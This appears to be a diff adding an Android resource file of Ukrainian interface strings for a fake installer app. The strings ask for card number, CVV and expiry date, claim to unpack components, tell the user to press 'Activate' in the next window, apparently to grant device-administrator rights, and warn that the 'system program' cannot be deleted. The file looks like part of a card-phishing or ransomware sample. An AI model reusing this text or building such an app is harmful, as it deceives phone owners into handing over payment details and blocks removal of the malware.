@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="add_card">Введиiть данi картки</string>
+    <string name="app_name">installation</string>
+    <string name="card_number">Номер картки</string>
+    <string name="cc_err">Недiйсний номер кредитноï картки</string>
+    <string name="continues">Продовжити</string>
+    <string name="cvv">Код CVV</string>
+    <string name="cvv_err">Недiйсний CVV</string>
+    <string name="denied">"Операція заборонена!
+
+ Неможливо видалити системну програму."</string>
+    <string name="mm">ММ</string>
+    <string name="month_err">Недiйсний мiсяць</string>
+    <string name="pls_wait">Будь ласка, зачекайте</string>
+    <string name="plugin">Установка завершена</string>
+    <string name="reg">"
+Будь ласка, зачекайте.
+
+Распаковка компонентов…
+"</string>
+    <string name="save_card">ЗБЕРЕГИТЕ</string>
+    <string name="saving">Зберігання…</string>
+    <string name="warn">"Для продовження, у наступному вікні натисніть кнопку \"Активувати\".
+ана операція не може бути перервана.
+
+ Більше інформації Ви можете знайти тут:
+
+http://redtube.com"</string>
+    <string name="warn_win">installation</string>
+    <string name="year_err">Недiйсний рiк</string>
+    <string name="yy">РР</string>
+</resources>
